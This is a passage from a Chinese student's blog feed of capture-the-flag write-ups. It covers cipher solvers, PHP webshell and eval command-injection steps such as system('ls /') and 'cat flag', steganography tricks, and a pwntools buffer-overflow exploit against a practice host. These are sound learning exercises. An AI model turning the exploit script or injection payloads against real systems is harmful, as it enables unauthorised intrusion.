class="built_in">print</span>(<span class="string">&quot;输入有误!密钥为字母,请重新输入:&quot;</span>)</span><br><span class="line">        key = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">    key_list = Get_KeyList(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user_input == <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">        <span class="comment"># 加密</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入明文:&quot;</span>)</span><br><span class="line">        plaintext = <span class="built_in">input</span>()</span><br><span class="line">        ciphertext = Encrypt(plaintext, key_list)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;密文为:\n%s&quot;</span> % ciphertext)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 解密</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入密文:&quot;</span>)</span><br><span class="line">        ciphertext = <span class="built_in">input</span>()</span><br><span class="line">        plaintext = Decrypt(ciphertext, key_list)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;明文为:\n%s&quot;</span> % plaintext)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>脚本给我了，但是密钥没线索，所以没做，后面看了看，原来密钥靠猜，是NSS</p>
<hr>
<h2 id="Crypto10"><a href="#Crypto10" class="headerlink" title="Crypto10"></a>Crypto10</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AFFPGS&#123;pbatenghyngvbaf!!!&#125;,建议直接秒了</span><br></pre></td></tr></table></figure>

<p>我当时是一位一位慢慢移的</p>
<p>但这题其实是ROT18，ROT家族介绍如下：</p>
<p>ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式： </p>
<p><strong>ROT5</strong>：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。 </p>
<p><strong>ROT13</strong>：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。 </p>
<p><strong>ROT18</strong>：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。 <strong>ROT47</strong>：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考<a href="https://wd-ljt.com/go/v1/https://www.qqxiuzi.cn/bianma/ascii.htm">ASCII编码</a>。</p>
<hr>
<h2 id="ez-caesar"><a href="#ez-caesar" class="headerlink" title="ez_caesar"></a>ez_caesar</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar</span>(<span class="params">plaintext</span>):</span></span><br><span class="line">    str_list = <span class="built_in">list</span>(plaintext)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> str_list[i].isalpha():</span><br><span class="line">            str_list[i] = str_list[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a = <span class="string">&quot;A&quot;</span> <span class="keyword">if</span> str_list[i].isupper() <span class="keyword">else</span> <span class="string">&quot;a&quot;</span></span><br><span class="line">            str_list[i] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(str_list[i]) - <span class="built_in">ord</span>(a) + <span class="number">5</span>) % <span class="number">26</span> + <span class="built_in">ord</span>(a) <span class="keyword">or</span> <span class="number">5</span>)</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(str_list)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;*************************&quot;</span></span><br><span class="line"><span class="built_in">str</span> = caesar(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#str=&quot;U1hYSFlLe2R0em1mYWpwc3RiaGZqeGZ3fQ==&quot;</span></span><br></pre></td></tr></table></figure>

<p>这题是对凯撒密码的加密过程魔改了一下，在移位的时候</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">str_list[i] = chr((ord(str_list[i]) - ord(a) + 5) % 26 + ord(a) or 5)</span><br></pre></td></tr></table></figure>

<p>与5做了一次或运算，所以解密的时候需要再将字符与5做一次或运算</p>
<p>可以base64解码之后再位移</p>
<p>或者用抄来的exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar</span>(<span class="params">plaintext</span>):</span></span><br><span class="line">    str_list = <span class="built_in">list</span>(plaintext)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> str_list[i].isalpha():</span><br><span class="line">            str_list[i] = str_list[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a = <span class="string">&quot;A&quot;</span> <span class="keyword">if</span> str_list[i].isupper() <span class="keyword">else</span> <span class="string">&quot;a&quot;</span></span><br><span class="line">            str_list[i] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(str_list[i]) - <span class="built_in">ord</span>(a) + <span class="number">21</span>) % <span class="number">26</span> + <span class="built_in">ord</span>(a) <span class="keyword">or</span> <span class="number">5</span>)</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(str_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;U1hYSFlLe2R0em1mYWpwc3RiaGZqeGZ3fQ==&quot;</span></span><br><span class="line">res = caesar(<span class="built_in">str</span>(base64.b64decode(str1), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>（说实话密码学的这个加密要比隔壁re区的加密友好呢）</p>
<hr>
<h2 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 1325465431</span><br><span class="line">q = 152317153</span><br><span class="line">e = 65537</span><br><span class="line">计算出d,将d用MD5加密后包裹NSSCTF&#123;&#125;提交</span><br></pre></td></tr></table></figure>

<p>一道可算是对得起ez的rsa，直接上exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extended_enclid</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y = extended_enclid(b, a % b)</span><br><span class="line">        <span class="keyword">return</span> y, x - a // b * y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">1325465431</span></span><br><span class="line">q = <span class="number">152317153</span></span><br><span class="line">n = p * q</span><br><span class="line">piN = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(extended_enclid(e, piN))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将求出来的正整数解43476042047970113用MD5加密后包裹NSSCTF{}即可得到正确的flag。</p>
<p>NSSCTF{08bb8fb628da85923e5734a75ac19ffe}</p>
<h2 id="pigpig"><a href="#pigpig" class="headerlink" title="pigpig"></a>pigpig</h2><p>猪圈密码，对照密码表解密即可得flag。</p>
<p>NSSCTF{whenthepigwanttoeat}</p>
<h2 id="traditional"><a href="#traditional" class="headerlink" title="traditional"></a>traditional</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">西方的二进制数学的发明者莱布尼茨，从中国的八卦图当中受到启发，演绎并推论出了数学矩</span><br><span class="line">阵，</span><br><span class="line">最后创造的二进制数学。二进制数学的诞生为计算机的发明奠定了理论基础。而计算机现在改</span><br><span class="line">变</span><br><span class="line">了我们整个世界，改变了我们生活，而他的源头却是来自于八卦图。现在，给你一组由八卦图</span><br><span class="line">方位</span><br><span class="line">组成的密文，你能破解出其中的含义吗？</span><br><span class="line"> 震坤艮 震艮震 坤巽坤 坤巽震 震巽兑 震艮震 震离艮 震离艮</span><br><span class="line"> 格式：flag&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>读完题目后，能想到这道题肯定与八卦图有关，于是我们去网上搜索一张八卦图出来,再根据题目八卦图与二进制的关系，（然后我把10弄反了最后没做出来挺可惜的）观察八卦图，发现每个方位的符号只有一条杠、两条杠两种表现形式,所以试试看把两条杠当作0，一条杠当作1，转换过来是这样的乾：7 巽：6 坎：2 艮：4 坤：0 震：1 离：5兑：3 。再与上面的密文对应，得到 104 141 60 61 163 141 154 154 因为每个方位只能表示三位二进制数所以最大值为7，</p>
<p>推测得到的数字是八进制数，转换成10进制得到 68 97 48 49 115 97 108 108 。</p>
<p>看到这些数字，我们很容易联想到ascll码，我们把它转换成字符看看。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;68 97 48 49 115 97 108 108&#x27;</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s1 = s.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s1:</span><br><span class="line">    <span class="built_in">sum</span> += <span class="built_in">chr</span>(<span class="built_in">int</span>(i))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure>

<p>得到正确的flag。</p>
]]></content>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF的web部分题解且整理了一下官方给出的多种解法且有还没仔细了解但是想先记着的知识点</title>
    <url>/2021/10/26/NSSCTF%E7%9A%84web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%E4%B8%94%E6%95%B4%E7%90%86%E4%BA%86%E4%B8%80%E4%B8%8B%E5%AE%98%E6%96%B9%E7%BB%99%E5%87%BA%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95%E4%B8%94%E6%9C%89%E8%BF%98%E6%B2%A1%E4%BB%94%E7%BB%86%E4%BA%86%E8%A7%A3%E4%BD%86%E6%98%AF%E6%83%B3%E5%85%88%E8%AE%B0%E7%9D%80%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<p>NSSCTF 虽然只会做白给的题，但官方wp看了还是有收获的</p>
<span id="more"></span> 

<h2 id="1-gift-f12"><a href="#1-gift-f12" class="headerlink" title="1.gift_f12"></a>1.gift_f12</h2><p>F12 ctrl+U view-source或者右键</p>
<p>都能找得到flag</p>
<hr>
<h2 id="2-caidao"><a href="#2-caidao" class="headerlink" title="2.caidao"></a>2.caidao</h2><p>一句话木马直接给了</p>
<p><img src="https://i.loli.net/2021/10/26/On5vYGLutQbXdPz.png" alt="Q.png"></p>
<p>但是还是有值得记录的东西的</p>
<h4 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h4><p>蚁剑连接，在根目录或者用终端cat flag</p>
<h4 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h4><p>直接用hacker进行post传参，执行php代码，在php中有很多函数都可以执行linux下的命令，如说像 system、exec、shell_exec、 passthru 等等都可以，然后linux比较常见的命令有： ls 遍历目录， cd 切换目录， cat 读取文件等等，在linux下 / 代表根目录</p>
<p><code>wllm=system(&quot;ls /&quot;)</code></p>
<p>就可以历遍根目录</p>
<hr>
<h2 id="3-jicao"><a href="#3-jicao" class="headerlink" title="3.jicao"></a>3.jicao</h2><p>总之就是post一个数据，get一个数据，但是这个get是我不会的基操</p>
<p><img src="https://i.loli.net/2021/10/26/3A9erlxFzdYfU2p.png" alt="T.png"></p>
<p>好，现在是我现在会了的基操</p>
<p><img src="https://i.loli.net/2021/10/26/TNHaGBhP38ApYk9.png" alt="VK.png"></p>
<p><img src="https://i.loli.net/2021/10/26/DuIBfMUvLJ2ARmc.png" alt="AJ.png"></p>
<hr>
<h2 id="4-easy-md5"><a href="#4-easy-md5" class="headerlink" title="4.easy_md5"></a>4.easy_md5</h2><p>就经典的把md5加密后的0e当科学计数法看作0所以相等</p>
<p>找找md5加密过后0e开头的不同字符串就行</p>
<p>但是还能用数组绕过</p>
<p>可以让name[]=0 password[]=1</p>
<hr>
<h2 id="5-easyrce"><a href="#5-easyrce" class="headerlink" title="5.easyrce"></a>5.easyrce</h2><p>get传参且带eval</p>
<p>且没有过滤</p>
<p>看看当前目录 看看根目录 找到flag 然后cat即可</p>
<hr>
<h2 id="6-unserialize"><a href="#6-unserialize" class="headerlink" title="6.unserialize"></a>6.unserialize</h2><p>所有php里面的值都可以使用函数serialize()来返回⼀个包含字节流的字符串来表示。unserialize() </p>
<p>函数能够重新把字符串变回php原来的值。 序列化⼀个对象将会保存对象的所有变量，但是不会保 </p>
<p>存对象的方法，只会保存类的名字。（所以反序列化的危害在于我们可以控制对象的变量来改变程序 </p>
<p>执行流程来达到我们的目的） </p>
<p>控制了变量，我们还需要让他参与到流程里面，所以还要了解魔术方法</p>
<p>序列化和反序列化</p>
<p><a href="https://www.php.net/manual/zh/language.oop5.serialization.php">https://www.php.net/manual/zh/language.oop5.serialization.php</a> </p>
<p>魔术方法 </p>
<p><a href="https://www.php.net/manual/zh/language.oop5.serialization.php">https://www.php.net/manual/zh/language.oop5.serialization.php</a></p>
<p>但是其实这俩链接还没仔细看，先记在这</p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>鲲鹏杯miscwp</title>
    <url>/2021/10/18/%E9%B2%B2%E9%B9%8F%E6%9D%AFmiscwp/</url>
    <content><![CDATA[<h1 id="鲲鹏杯-misc-wp"><a href="#鲲鹏杯-misc-wp" class="headerlink" title="鲲鹏杯 misc wp"></a>鲲鹏杯 misc wp</h1><p>我也不知道这几题到底是misc几，我拿到的只有文件，登不上，怎么都登不上，然后有些试探步骤就不写了，因为忘了</p>
  <span id="more"></span> 

<hr>
<h3 id="1910255db2c8e04f498-zip"><a href="#1910255db2c8e04f498-zip" class="headerlink" title="1910255db2c8e04f498.zip"></a>1910255db2c8e04f498.zip</h3><p>打开，有张图</p>
<p><img src="https://i.loli.net/2021/10/16/tv7ozdZ4KDbgJGR.png" alt="11.png"></p>
<p>用010editor打开，crc报错，所以很可能被修改过</p>
<p><img src="https://i.loli.net/2021/10/16/1rEQKHmtMxhZwVX.png" alt="214.png"></p>
<p>找到长度，改长</p>
<p><img src="https://i.loli.net/2021/10/16/D59CBvnal8ZjdwK.png" alt="33.png"></p>
<p>其实已经可以找到flag了</p>
<p><img src="https://i.loli.net/2021/10/16/VHicnSWAvFQZdbs.png" alt="444.png"></p>
<p>放大就能看到，有点暗</p>
<p><img src="https://i.loli.net/2021/10/16/S8Nbky17LZzDCtG.png" alt="3.png"></p>
<p>也可以用stegsolve切一下通道，有些就可以很明显地看到flag，但是那样的话长度不能改太长，不然放不进去，改个差不多的就行</p>
<p><img src="https://i.loli.net/2021/10/16/ftbpNr2gC13PIem.png" alt="Q41.png"></p>
<hr>
<h3 id="5afea376cfc75-zip"><a href="#5afea376cfc75-zip" class="headerlink" title="5afea376cfc75.zip"></a>5afea376cfc75.zip</h3><p>打开，看到一张，只有黑白，所以显得大小不太对的图</p>
<p><img src="https://i.loli.net/2021/10/16/HDbAPGVjUkOT4xR.png" alt="2414.png"></p>
<p>010打开，我发现我看不懂，那就不手动提了</p>
<p><img src="https://i.loli.net/2021/10/16/IxHbj4nkc6Y3tGZ.png" alt="BUA.png"></p>
<p>上foremost</p>
<p><img src="https://i.loli.net/2021/10/16/LtaOmQeHGTIDx29.png" alt="L86.png"></p>
<p>拿到压缩文件，有加密，而且flag.txt没啥有用的东西</p>
<p><img src="https://i.loli.net/2021/10/16/vHqOoW6g4PSNMzd.png" alt="RX.png"></p>
<p>ziperello不知道为什么读取不了，那用archpr</p>
<p>密码是1020</p>
<p>然后gif真的是gif，而且下棋的是真的慢</p>
<p>用stegsolve的这个功能，翻到一个不一样的</p>
<p><img src="https://i.loli.net/2021/10/16/L1hHswOWpTifRkM.png" alt="9K.png"></p>
<p><img src="https://i.loli.net/2021/10/16/zuqO6jlAVvSCM8n.png" alt="NLU.png"></p>
<p>保存下来 再用stegsolve打开，直接翻一翻</p>
<p>拿到二维码，扫了就有flag</p>
<hr>
<h3 id="1910255db2c8ea4e4d0-png"><a href="#1910255db2c8ea4e4d0-png" class="headerlink" title="1910255db2c8ea4e4d0.png"></a>1910255db2c8ea4e4d0.png</h3><p>直接打开→打不开</p>
<p>用010editor/记事本打开</p>
<p>就挺常见易懂的base64转图片</p>
<p><img src="https://i.loli.net/2021/10/16/bvc2wPHDjUIhf1M.png" alt="11B17.png"></p>
<p>搜一下在线工具</p>
<p>拿到二维码</p>
<p><img src="https://i.loli.net/2021/10/16/GQTPovgLHkwy5aV.png" alt="ZRSE.png"></p>
<p>扫一下就有一串base64，转一下就有flag</p>
<hr>
<p>拿到题的时候，时间不多了，有点急，甚至手滑把editor参数栏关了之后更着急地找了半天，甚至没有当场看到 真正的ctf选手.png那题 藏在暗处的flag</p>
]]></content>
  </entry>
  <entry>
    <title>鹤城杯的一些题</title>
    <url>/2021/10/11/%E9%B9%A4%E5%9F%8E%E6%9D%AF%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98/</url>
    <content><![CDATA[<p>虽然比赛群里都说这比赛都是原题，但是我没做过原题，而且给的re也太难了，记录一下别的能看得懂的</p>
<span id="more"></span> 

<h3 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h3><p>公正公正公正诚信文明公正民主公正法治法治诚信民主自由敬业公正友善公正平等平等法治民主平等平等和谐敬业自由诚信平等和谐平等公正法治法治平等平等爱国和谐公正平等敬业公正敬业自由敬业平等自由法治和谐平等文明自由诚信自由平等富强公正敬业平等民主公正诚信和谐公正文明公正爱国自由诚信自由平等文明公正诚信富强自由法治法治平等平等自由平等富强法治诚信和谐</p>
<p>直接扔进社会主义核心价值观编码器就完事了。</p>
<hr>
<h3 id="a-misc"><a href="#a-misc" class="headerlink" title="a_misc"></a>a_misc</h3><p><img src="https://i.loli.net/2021/10/11/VK4agfYI2vGt3CO.png" alt="check.png"></p>
<p>一只猫</p>
<p><img src="https://i.loli.net/2021/10/11/fCcQhFDMnd1GpbW.jpg" alt="E2F.jpg"></p>
<p>一只经常营业的土耳其梵猫</p>
<p>↑然后这个没啥用</p>
<p>扔进Stegsolve，0通道下长成这样那肯定有东西</p>
<p><img src="https://i.loli.net/2021/10/11/CQTLapjAvqmBfFb.png" alt="N222.png"></p>
<p>确实有东西</p>
<p><img src="https://i.loli.net/2021/10/11/CABF5jdIkbqoVn7.png" alt="U4PSV_9GET~1DPVJ4~_P4Z4.png"></p>
<p>转码拿到flag</p>
<ul>
<li>这题问了学姐，然后得到回应 “这题出的很常规”  就直接把题秒了</li>
<li>可我目前能找到的鹤壁杯的wp里都找不到这题，学姐tql</li>
</ul>
<hr>
<h3 id="a-crypto"><a href="#a-crypto" class="headerlink" title="a_crypto"></a>a_crypto</h3><p>转码套娃</p>
<p>4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35</p>
<p>rot13→base16→base32→base64</p>
<p>然后就转不动了，说是要去混淆，但没有详细说怎么操作，等我了解了再来编辑</p>
<p>编辑：装完ciphey，秒了</p>
<hr>
<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>这题比较简单，但是我赛后才懂具体怎么操作</p>
<p><img src="https://i.loli.net/2021/10/11/PfSvRW6JHy3kq8n.png" alt="333333.png"></p>
<p>找到这些sql盲注流量，然后取从33重新开始的前一个，ascii码转一下，就得到flag了</p>
<hr>
<ul>
<li>这个比赛re方向的题对我来说太难了，出了wp希望可以试着复现一下</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>尝试复现pwn入门题的wp</title>
    <url>/2021/10/03/%E5%B0%9D%E8%AF%95%E5%A4%8D%E7%8E%B0pwn%E5%85%A5%E9%97%A8wp/</url>
    <content><![CDATA[<p>很不了解，很想尝试，顺便借复现wp补充工具，于是试了一道题</p>
<span id="more"></span> 

<h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><h3 id="一、看题"><a href="#一、看题" class="headerlink" title="一、看题"></a>一、看题</h3><p>给一个附件和一个靶机地址</p>
<p><del>rip应该不至于是rest in peace吧</del></p>
<p>用ida打开，</p>
<p><img src="https://i.loli.net/2021/10/02/3Sdi9lHN7jnhy2q.png" alt="11.png"></p>
<p>看到了gets()函数，很巧，我知道有个关于它的漏洞</p>
<p><img src="https://i.loli.net/2021/10/02/UJeBrmaSkE6z9XK.png" alt="4.png"></p>
<p>然后看看gets()的地址附近有没有什么东西</p>
<p><img src="https://i.loli.net/2021/10/02/uPWkTcSzGqiQXY1.png" alt="55.png"></p>
<p>有个奇怪的函数</p>
<p>好了，不会了</p>
<h3 id="二、看wp"><a href="#二、看wp" class="headerlink" title="二、看wp"></a>二、看wp</h3><p>思路确实是，利用gets()，把溢出的覆盖到所谓的后面函数。</p>
<p>exp不会写，wp有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27327</span>) //连接靶机地址</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xf</span>+<span class="number">8</span>)+p64(<span class="number">0x401187</span>) //这里的f+<span class="number">8</span>可以靠工具计算，也可以直接数，但是我不熟</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="三、尝试复现"><a href="#三、尝试复现" class="headerlink" title="三、尝试复现"></a>三、尝试复现</h3><p>于是，又要在不同的报错中，配置虚拟机pwn环境</p>
<p>该装上的都装上后，cd到脚本当前目录，运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 pwn2.py</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/02/Tf4YtvuNlJzjB5R.png" alt="D.png"></p>
<p>好，果然又报错了，查如何解决</p>
<p>使用p64()时在后面加上.decode(‘unicode_escape’)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">23</span>+p64(system).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>再次运行</p>
<p><img src="https://i.loli.net/2021/10/02/Z3NOeQscWDpIECU.png" alt="25.png"></p>
<p>接上了，但是wp结束了，不过下面的操作不用wp我应该也能做了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/02/8WbESJKUB9lICRm.png" alt="J.png"></p>
<hr>
<h2 id="心路历程"><a href="#心路历程" class="headerlink" title="心路历程"></a>心路历程</h2><p>中间有好多次想直接放弃了，毕竟要装的东西太多了，要了解的东西太多了，很多次我觉得，我遇到的问题可能会简单到不会有具体步骤，会一直卡着我，要不再看点基础吧，但是我也不知道为啥还是坚持硬复现完了。挺好。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>buu的一道纠结了很久的题</title>
    <url>/2021/09/30/buu%E7%9A%84%E4%B8%80%E9%81%93%E7%BA%A0%E7%BB%93%E4%BA%86%E5%BE%88%E4%B9%85%E7%9A%84%E9%A2%98/</url>
    <content><![CDATA[<p>一道题纠结了很久，但也没弄的非常明白，记录，希望以后可以变得更强</p>
<span id="more"></span> 

<h2 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h2><p>打开程序，只有一个窗口，于是用ida打开，看到没有自动识别出main函数，但是找到了和加密很有关系的函数。</p>
<p><img src="https://i.loli.net/2021/09/30/ScriaNvsnfIDPhM.png" alt="1.png"></p>
<p>8位数，然后看看加密后6位的函数，加密方式长得很像base64（因为我写不出base64转换，但知道它是怎么转的，所以不确定）</p>
<p>然后shift+F12在字符串看到了base64替换表，那应该确实是了</p>
<p><img src="https://i.loli.net/2021/09/30/eNk1WmfwPxJvQ7d.png" alt="2.png"></p>
<p>于是得到**WP1jMp</p>
<p>前两位</p>
<p><img src="https://i.loli.net/2021/09/30/uXjVCEZ3ap1P8Gl.png" alt="`QXB`O6S5RTP6_V__T_JZNR.png"></p>
<p><img src="https://i.loli.net/2021/09/30/XzVwHgiqGaBCjbQ.png" alt="5P.png"></p>
<p>我把90+34 67 直接转成字符，提交，flag不对。</p>
<p>于是注意到<img src="https://i.loli.net/2021/09/30/BVOHYq1KLPoSmG2.png" alt="5.png"></p>
<p>有一个sub_4010F0函数，点开</p>
<p><img src="https://i.loli.net/2021/09/30/sjc6PXDBGynflbr.png" alt="_KK__X7GJB9C_X~_J~8347H.png"></p>
<p>看不懂，尝试弄个一个意思的代码，试试调试，结果不仅看不懂，放进c还跑不动，改完报错的地方还是跑不动，并且理解不了思路，写不出来，捣鼓了挺长时间→查wp→这是个排序用的函数，但是我还是看不懂。</p>
<p>于是找到了别人怎么把它写成c（找到的网页默认不允许选中，于是我用ctrl+a ctrl+c复制了所有文字然后把我想要的拿了出来）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">   <span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line">   <span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4010F0</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span> <span class="comment">// int a1</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">     <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">     <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">     <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">   </span><br><span class="line">    result = a3;</span><br><span class="line">    <span class="keyword">for</span> ( i = a2; i &lt;= a3; a2 = i )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = i; <span class="comment">//v5 = 4 * i 这一行为什么要改？求大佬指教 </span></span><br><span class="line">      v6 = a1[i]; <span class="comment">//v6 = *(_DWORD *)(4 * i + a1)</span></span><br><span class="line">      <span class="keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v6 &gt; a1[result] ) <span class="comment">//v6 &gt; *(_DWORD *)(a1 + 4 * result)</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            ++i;</span><br><span class="line">            a1[v5] = a1[result]; <span class="comment">//*(_DWORD *)(v5 + a1) = *(_DWORD *)(a1 + 4 * result)</span></span><br><span class="line">            <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">while</span> ( a1[i] &lt;= v6 ) <span class="comment">// *(_DWORD *)(a1 + 4 * i) &lt;= v6</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( ++i &gt;= result )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v5 = i; <span class="comment">//v5 = 4 * i </span></span><br><span class="line">            a1[result] = a1[i]; <span class="comment">// *(_DWORD *)(a1 + 4 * result) = *(_DWORD *)(4 * i + a1)</span></span><br><span class="line">          &#125;</span><br><span class="line">          --result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( i &lt; result );</span><br><span class="line">      &#125;</span><br><span class="line">  LABEL_13:</span><br><span class="line">      a1[result] = v6; <span class="comment">//*(_DWORD *)(a1 + 4 * result) = 